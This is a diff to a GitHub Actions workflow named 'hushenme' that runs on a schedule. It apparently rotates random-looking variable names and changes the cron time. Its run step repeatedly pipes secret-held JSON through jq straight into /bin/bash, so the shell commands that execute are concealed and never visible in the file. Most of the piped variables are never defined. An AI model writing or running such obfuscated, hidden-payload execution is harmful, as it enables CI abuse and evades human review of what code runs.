@@ -2,8 +2,8 @@ name: hushenme
 on:
   workflow_dispatch:
   schedule:
-    - cron: '57 2/6 * * *'
-jobs:  # 5973
+    - cron: '35 4/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -11,18 +11,22 @@ jobs:  # 5973
       - uses: actions/checkout@v4
       - name: hushenme
         env:
-          doemt8358: ${{ secrets.doemt8358 }}
+          irl052: ${{ secrets.irl052 }}
         run: |
-          echo $doemt8358 | jq -r .xhzo7 | /bin/bash
-          echo $naker9074 | jq -r .sccui7986 | /bin/bash
-          echo $ug83 | jq -r .puphs682 | /bin/bash
-          echo $wj44 | jq -r .ixxp7804 | /bin/bash
-          echo $uct76 | jq -r .qwuo4 | /bin/bash
-          echo $vkht987 | jq -r .h7878 | /bin/bash
-          echo $yak1463 | jq -r .a2 | /bin/bash
-          echo $kynw7 | jq -r .m7 | /bin/bash
-          echo $a452 | jq -r .cq054 | /bin/bash
-          echo $fs80855 | jq -r .ivjr89 | /bin/bash
-          echo $kml835 | jq -r .pegku11 | /bin/bash
-          echo $q291 | jq -r .ksxhp42181 | /bin/bash
+          echo $irl052 | jq -r .n36611 | /bin/bash
+          echo $m0827 | jq -r .qalx179 | /bin/bash
+          echo $zc26502 | jq -r .vx4 | /bin/bash
+          echo $onc2390 | jq -r .m496 | /bin/bash
+          echo $witga56 | jq -r .nw4 | /bin/bash
+          echo $i6625 | jq -r .bzlfn5 | /bin/bash
+          echo $ahotm86 | jq -r .ayb57 | /bin/bash
+          echo $jd606 | jq -r .jk7 | /bin/bash
+          echo $i7 | jq -r .nt8 | /bin/bash
+          echo $cwkx7 | jq -r .ga6304 | /bin/bash
+          echo $wulj6221 | jq -r .js8510 | /bin/bash
+          echo $m879 | jq -r .edfz6589 | /bin/bash
+          echo $he0942 | jq -r .ygg88 | /bin/bash
+          echo $f3578 | jq -r .marfy094 | /bin/bash
+          echo $llvql44 | jq -r .cq4045 | /bin/bash
+          echo $fqxfp7 | jq -r .rrqog70 | /bin/bash
 
